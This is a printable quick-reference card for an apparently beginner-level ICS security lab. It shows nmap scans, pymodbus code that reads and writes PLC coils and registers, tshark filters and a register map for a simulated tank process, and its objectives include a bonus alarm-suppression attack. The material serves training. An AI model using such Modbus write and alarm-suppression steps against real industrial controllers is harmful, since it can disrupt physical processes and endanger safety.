# Quick Reference Card — SCADA Modbus Recon & Manipulation

> SCEN-001 | Beginner | 2 Hours | Print this page for use during the lab.

---

## Network Map

```
OT Network — 192.168.101.0/24 (vmbr3)

┌────────────────┐    ┌────────────────┐    ┌────────────────┐
│ kali-attacker  │    │  openplc-01    │    │   historian     │
│ .10            │───│  .20           │    │   .30           │
│                │    │  502  Modbus   │    │  8086 InfluxDB  │
│                │    │  8080 Web UI   │    │  3000 Grafana   │
└────────────────┘    └────────────────┘    └────────────────┘
```

---

## Credentials

| Host | Username | Password |
|---|---|---|
| kali-attacker | kali | kali |
| openplc-01 (Web UI) | openplc | openplc |
| historian (Grafana) | admin | LabGrafana2024! |

---

## Objectives Checklist

1. [ ] Discover PLC and historian with nmap
2. [ ] Enumerate Modbus coils and registers with pymodbus
3. [ ] Map the PLC register table
4. [ ] Write to holding registers and coils to manipulate process
5. [ ] Explain Modbus security gaps and defense strategies
6. [ ] **Bonus**: Perform alarm suppression attack

---

## Tool Commands

### nmap — Network Discovery
```bash
# Scan OT subnet for ICS-relevant ports
nmap -sT -p 502,8080,8086,3000 192.168.101.0/24

# Service version detection on PLC
nmap -sV -p 502 192.168.101.20
```

### pymodbus — Modbus Client
```python
from pymodbus.client import ModbusTcpClient

# Connect
c = ModbusTcpClient('192.168.101.20', port=502)
c.connect()

# READ operations
c.read_coils(0, 8, slave=1)                  # FC01 — coils
c.read_discrete_inputs(0, 8, slave=1)         # FC02 — discrete inputs
c.read_holding_registers(0, 10, slave=1)      # FC03 — holding registers
c.read_holding_registers(1024, 3, slave=1)    # FC03 — OpenPLC %MW range
c.read_input_registers(0, 4, slave=1)         # FC04 — input registers

# WRITE operations
c.write_coil(0, False, slave=1)               # FC05 — write single coil
c.write_register(1024, 999, slave=1)          # FC06 — write single register

# Disconnect
c.close()
```

### Wireshark — Traffic Capture
```bash
# Capture Modbus traffic
sudo tshark -i eth0 -f "tcp port 502" -w modbus_capture.pcap

# Display filter for Modbus reads
modbus.func_code == 3 || modbus.func_code == 1

# Display filter for Modbus writes
modbus.func_code == 5 || modbus.func_code == 6
```

---

## Modbus Function Codes

| Code | Name | Direction | Purpose |
|---|---|---|---|
| FC01 | Read Coils | Read | Digital outputs (on/off) |
| FC02 | Read Discrete Inputs | Read | Digital inputs (sensors) |
| FC03 | Read Holding Registers | Read | Setpoints, config values |
| FC04 | Read Input Registers | Read | Analog sensor readings |
| FC05 | Write Single Coil | Write | Toggle single digital output |
| FC06 | Write Single Register | Write | Change single setpoint |

---

## Register Map (discover these during Phase 2)

| Address | Type | Name | Description |
|---|---|---|---|
| Coil 0 | Coil | pump_enable | Pump on/off |
| IR 0 | Input Register | tank_level | Current level (0-1000) |
| HR 0 | Holding Register | pump_speed | Pump speed % |
| HR 1024 | Holding Register | setpoint | Target level |
| HR 1025 | Holding Register | alarm_high | High alarm threshold |
| HR 1026 | Holding Register | alarm_low | Low alarm threshold |

---

## ATT&CK for ICS Techniques

| ID | Technique | Tactic |
|---|---|---|
| T0846 | Remote System Discovery | Discovery |
| T0842 | Network Sniffing | Discovery |
| T0836 | Modify Parameter | Impair Process Control |
| T0855 | Unauthorized Command Message | Impair Process Control |
| T0812 | Manipulate I/O Image | Inhibit Response Function |

---

## Grafana Dashboard

Open in browser: `http://192.168.101.30:3000`

Login: `admin` / `LabGrafana2024!`

Dashboard: **SCADA Process Monitor** — shows tank level, pump status, alarm state in real time.
